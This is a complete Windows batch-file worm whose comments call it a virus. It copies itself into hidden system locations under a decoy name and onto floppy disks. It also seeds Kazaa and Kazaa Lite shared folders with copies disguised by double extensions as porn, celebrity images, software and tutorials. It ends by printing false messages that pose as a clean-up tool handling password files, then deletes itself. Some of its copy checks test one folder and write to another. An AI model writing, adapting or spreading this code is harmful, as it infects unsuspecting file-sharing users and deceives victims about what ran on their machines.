rem------------Start ---------------------

@ECHO OFF

rem ---------- Hides 3 files so theres still at least 3 copies on there computer and 1 on floppy disk if inserted ---------
Attrib -H %0
Attrib -H "C:\Program Files\*.bat"
Attrib -H "C:\Program Files\Internet Explorer\*.bat"

if Not Exist "C:\sysconfig.bat" Copy %0 "C:\sysconfig.bat"
if Not Exist "C:\Program Files\sysconfig.bat" Copy %0 "C:\Program Files\sysconfig.bat"
If Not Exist "C:\Documents and Settings\sysconfig.bat" Copy %0 "C:\Documents and Settings\sysconfig.bat"
If Not Exist "A:\Just a few extra pictures i thought youd like to see!.bat" Copy %0 "A:\Just a few extra pictures i thought youd like to see!.bat"

Attrib +H "C:\Program Files\*.bat"
Attrib +H "C:\Program Files\Internet Explorer\*.bat"
Attrib -H %0

Rem ----------------------------------------- now spreads virus using kazaa -----------------------------------------------

rem - Kazaa Users
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
If Not Exist "C:\Program Files\Kazaa\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"

rem - Kazza Lite users
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Mega wet bitch.jpeg.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Porn mainia.exe.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.jpg.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Celebrity heaven.exe.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tutorial.doc.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Visual Basic Tips.txt.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Music Creator v7.exe.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Jukebox v9.1.exe.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Collection of programs.exe.bat"
If Not Exist "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat" Copy %0 "C:\Program Files\Kazaa Lite\My Shared Folder\Fingering.bmp.bat"

Echo Your password files have been copied and your other temporary internet files deleted.
Echo Your password files have then been copied back to there original CLEAN location.
Echo Thank you for using this Clean up program! :-)
del %0

rem------------End ---------------------